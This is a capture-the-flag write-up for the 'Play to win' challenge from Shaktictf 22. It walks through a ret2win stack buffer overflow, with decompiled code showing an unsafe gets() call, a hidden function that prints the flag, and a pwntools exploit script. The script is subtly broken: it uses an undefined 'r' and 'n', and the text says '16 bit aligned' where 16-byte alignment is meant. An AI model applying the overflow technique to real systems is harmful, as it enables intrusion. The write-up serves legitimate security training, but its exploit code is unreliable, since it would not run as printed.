# Shaktictf 22 writeups

## Play to win
DESCRIPTION:

I was playing a game of adding words with my friends, until I added one too long!

Note: The server is running on Ubuntu 20.04.

FLAG FORMAT: shakti{}
### Intended solution:
This is a basic ret2win challenge.

A binary file is given as an attachment, where the usual checks give:

![](https://i.imgur.com/NqZOOmp.png)

![](https://i.imgur.com/BVAl2Cl.png)

Running the file-

![](https://i.imgur.com/3gEnXL2.png)


Decompiling the game fuction in binary gives the following-
```
int game()
{
  int result; // eax
  int v1; // eax
  char v2[2]; // [rsp+8h] [rbp-18h] BYREF
  char s[10]; // [rsp+Ah] [rbp-16h] BYREF
  int v4; // [rsp+14h] [rbp-Ch]
  int v5; // [rsp+18h] [rbp-8h]
  int v6; // [rsp+1Ch] [rbp-4h]

  puts("You think you can do this?");
  result = puts("I don't think so.");
  v5 = 0;
  v4 = 0;
  while ( v5 != 1 )
  {
    printf("Add the word:");
    gets(s);        //gets function here!
    v1 = strlen(s);
    result = v1 + v4;
    v4 = result;
    if ( result == 10000 )
    {
      v5 = 1;
      v6 = 1;
      break;
    }
    puts("Do you want to continue?");
    printf("Yes or No [y/n]:");
    __isoc99_scanf("%s", v2);
    getchar();
    result = (unsigned __int8)v2[0];
    if ( v2[0] == 121 || (result = (unsigned __int8)v2[0], v2[0] == 89) )
    {
      v5 = 0;
    }
    else
    {
      result = (unsigned __int8)v2[0];
      if ( v2[0] == 110 || (result = (unsigned __int8)v2[0], v2[0] == 78) )
        v5 = 1;
      else
        result = puts("Wrong input.");
    }
  }
  if ( v6 == 1 )
  {
    winfunc();
    exit(0);
  }
  return result;
}
```
The basic objective of the game is to add words till the combined length of them all reaches 10000, upon which the game re-directs to a winfunc(), where it prints :
 ```
Ah well, you did win afterall.
I guess congratlations are in order.
```
 On opening the file in gdb and observing all the functions-

![](https://i.imgur.com/hBilDaC.png)

We see that there are two win fuctions here, winfunc and reallywin.And reallywin shows:
```
void __noreturn reallywin()
{
  puts("I may have underestimated you");
  puts("You win!");
  system("cat flag.txt");
  exit(0);
}
```
So basically you just have to redirect the control flow of the rip to reallywin. We have a gets fuction here, so we can overflow and overwrite rip.

Now as stack is 16 bit aligned, it took 30 bytes of data to overwrite the buffer and we have to use the ret gadget to return back to the stack and overwrite rip with address of `reallywin`


Exploit:

```python
from pwn import *
elf = ELF("game")
io=process(elf.path)
ret = 0x40101a # Used to align stack

win = elf.symbols['reallywin']

#Fill the Buffer with 30 A's --> overwrite return address with ret gadget to align the stack --> then address of the reallywin function
payload = b"A"*30 + p64(ret) + p64(win)
r.sendline(payload)
r.sendline(n) #to pass last check
r.interactive()
```
This gives the flag:
`shakti{G0od_joB_5olviNg_Thi5_1}`
